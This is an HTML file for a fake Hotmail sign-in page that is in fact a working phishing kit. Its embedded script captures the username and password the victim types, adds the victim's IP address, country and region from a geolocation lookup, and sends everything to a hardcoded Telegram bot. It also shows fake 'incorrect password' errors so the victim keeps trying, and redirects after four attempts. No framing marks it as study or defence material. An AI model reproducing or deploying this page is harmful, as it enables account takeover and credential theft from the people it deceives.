<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail</title>
    <!-- FAVICON -->
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,500;1,700&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">

    <style>
        /* Hotmail Theme Colors */
        body {
            background-color: #0078d4; /* Hotmail blue */
            font-family: 'Roboto', sans-serif;
        }

        .container {
            max-width: 450px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
        }

        .logo img {
            width: 160px;
        }

        .btn-login {
            background-color: #0078d4; /* Hotmail blue */
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }

        .btn-login:hover {
            background-color: #005a9e; /* Darker Hotmail blue */
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        .form-group span {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #333;
        }

        .error-message {
            color: red;
            margin-top: 10px;
            text-align: center;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
        }

        .footer a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer .copyright {
            margin-top: 10px;
            color: #999;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .store-link img {
            width: 130px;
            margin: 10px;
        }

        .darkmode-toggle {
            color: #333;
            text-decoration: none;
            padding: 5px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="main-container">
        <div class="main-content">
            <div class="form-container">
                <form id="contactForm">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/hotmail-logo.png" alt="Hotmail logo">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Phone number, username or email</span>
                                    <input type="text" name="username" id="username" required>
                                    <input type="hidden" name="_captcha" value="false">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>Password</span>
                                    <input type="password" name="password" id="password" required>
                                    <button type="button" onclick="togglePassword()">Show</button>
                                </div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" type="submit">Log In</button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div id="error-message" class="error-message"></div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="#" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>Don't have an account? <a href="#">Sign up</a></p>
                    </div>

                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a href="#"><img src="./images/app-store.png" alt="app store"></a>
                            <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
                        </div>
                    </div>
                    <input type="hidden" id="attempt" name="attempt" value="0">
                </form>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <div class="copyright">
            © 2025 Hotmail from Microsoft
        </div>
    </div>
</div>

<!-- APP JS -->
<script src="app.js"></script>

<script>
    let attemptCount = 0;

    function togglePassword() {
        var passwordInput = document.getElementById("password");
        var showButton = passwordInput.nextElementSibling;
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            showButton.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            showButton.textContent = "Show";
        }
    }

    async function fetchGeoInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                return await response.json();
            } else {
                throw new Error('Failed to fetch IP information');
            }
        } catch (error) {
            console.error(error);
            return null;
        }
    }

    async function handleLogin(event) {
        event.preventDefault();
        attemptCount++;
        const form = document.getElementById("contactForm");
        const errorMessage = document.getElementById("error-message");

        const geoInfo = await fetchGeoInfo();
        if (!geoInfo) {
            errorMessage.textContent = "Failed to fetch IP information. Please try again.";
            return;
        }

        document.getElementById("attempt").value = "Attempt " + attemptCount;

        // Prepare the message to send to Telegram
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const ip = geoInfo.ip;
        const country = geoInfo.country_name;
        const state = geoInfo.region;
        const app = 'Hotmail';
        const textMessage = `🔐 *New login attempt:* \n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌍 *IP Address:* ${ip}\n🇺🇸 *Country:* ${country}\n🏙️ *State:* ${state}\n📱 *App:* ${app}\n🔄 *Attempt:* Attempt ${attemptCount}`;

        const chatId = '7302182899'; // Replace with your chat ID
        const token = '7927201057:AAGrGv0X4h9t3p3QSxlXMTZaBJA9zGyuaZQ'; // Replace with your bot token

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;

        // Send the message using fetch
        fetch(url, {
            method: "POST"
        }).then(response => response.json()).then(data => {
            if (data.ok) {
                console.log('Message sent successfully!');
            } else {
                console.log('Failed to send message.');
            }
        }).catch(error => {
            console.error('Error:', error);
            console.log('Error sending message.');
        });

        if (attemptCount >= 4) {
            window.location.href = "flock.html"; // Redirect after 4 attempts
        } else {
            errorMessage.textContent = "❌ Incorrect password. Try again.";
        }

        // Hide the error message when the user starts typing again
        document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
        document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
    }

    document.getElementById("contactForm").addEventListener("submit", handleLogin);
</script>
</body>
</html>
